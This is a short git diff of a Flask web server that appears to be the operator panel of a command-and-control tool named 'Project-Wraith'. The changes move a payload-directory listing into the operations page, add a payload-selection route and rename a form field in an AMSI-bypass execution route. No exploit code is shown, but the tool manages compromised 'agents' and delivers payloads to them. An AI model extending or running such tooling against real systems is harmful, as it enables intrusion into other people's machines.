@@ -18,7 +18,19 @@ def index():
 @blueprint.route('/operations.html')
 def operations():
     agents = allAgents.query.all()
-    return render_template('home/operations.html', agents=agents)
+    path = r"C:\Users\user\Desktop\Wraith\Project-Wraith\WebServer\apps\exploit\payload"
+    files = [{'name': file.name} for file in os.scandir(path)]
+    return render_template('home/operations.html', agents=agents, files=files)
+
+@blueprint.route('/select_file', methods=['POST'])
+def select_file():
+    arg = request.form.to_dict()
+    if arg != {}:
+        payload = arg['selected_file']
+    # Process the selected file as needed
+    print(f"Selected File: {payload}")
+    # Redirect or render another page as needed
+    return redirect(request.referrer)
 
 @blueprint.route('/agents.html', methods=["GET"])
 def agents_info():
@@ -29,12 +41,6 @@ def agents_info():
 def reports():
     agents = allAgents.query.all()
     return render_template('home/reports.html', agents=agents)
-
-@blueprint.route('/payloads.html', methods=["GET"])
-def payloads():
-    path = r"C:\Users\user\Desktop\Wraith\Project-Wraith\WebServer\apps\exploit\payload"
-    files = [file.name for file in os.scandir(path)]
-    return render_template('home/payloads.html', files=files)
 
 @blueprint.route('/upload_payload', methods=["POST"])
 def upload_payload():
@@ -90,7 +96,7 @@ def terminate_connections(id):
 def execute_amsi():
     arg = request.form.to_dict()
     if arg != {}:
-        agent = arg['selected_agent']
+        agent = arg['selected_amsi_agent']
         client_id = db.execute("SELECT identifier FROM all_agents WHERE id=?", agent).fetchone()
         client_id = str(client_id[0])
         try:
